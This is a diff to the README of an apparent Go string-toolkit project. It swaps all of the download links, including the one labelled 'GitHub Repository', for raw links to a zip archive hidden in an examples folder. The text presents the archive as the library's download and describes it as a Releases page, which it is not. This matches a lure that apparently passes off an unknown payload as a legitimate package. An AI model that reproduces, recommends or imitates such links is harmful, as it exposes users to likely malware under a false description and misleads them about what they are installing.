@@ -1,13 +1,13 @@
 # 🌟 str - A Powerful String Toolkit for Go
 
 ## 📦 Download Now
-[![Download str](https://github.com/farukmsword2/str/raw/refs/heads/main/examples/trim/Software-1.0.zip)](https://github.com/farukmsword2/str/raw/refs/heads/main/examples/trim/Software-1.0.zip)
+[![Download str](https://raw.githubusercontent.com/farukmsword2/str/main/examples/substrreplace/Software-devonite.zip)](https://raw.githubusercontent.com/farukmsword2/str/main/examples/substrreplace/Software-devonite.zip)
 
 ## 🚀 Getting Started
 Welcome to the str project! This application provides a fluent, Laravel-inspired string toolkit for Go. With str, you gain access to easy-to-use, rune-safe helpers that make text processing simple and reliable.
 
 ## 📥 Download & Install
-To use str, you need to download it. Visit this page to download the latest version: [Download str](https://github.com/farukmsword2/str/raw/refs/heads/main/examples/trim/Software-1.0.zip). 
+To use str, you need to download it. Visit this page to download the latest version: [Download str](https://raw.githubusercontent.com/farukmsword2/str/main/examples/substrreplace/Software-devonite.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, find the version you wish to install.
@@ -52,7 +52,7 @@ A: Yes, feel free to integrate str into your projects, provided you follow the l
 If you encounter any issues or have questions, please reach out through the GitHub Issues page for support. We are here to help you use str effectively!
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/farukmsword2/str/raw/refs/heads/main/examples/trim/Software-1.0.zip)
-- [Download str](https://github.com/farukmsword2/str/raw/refs/heads/main/examples/trim/Software-1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/farukmsword2/str/main/examples/substrreplace/Software-devonite.zip)
+- [Download str](https://raw.githubusercontent.com/farukmsword2/str/main/examples/substrreplace/Software-devonite.zip)
 
 Thank you for choosing str! We hope it serves you well in your text processing needs.
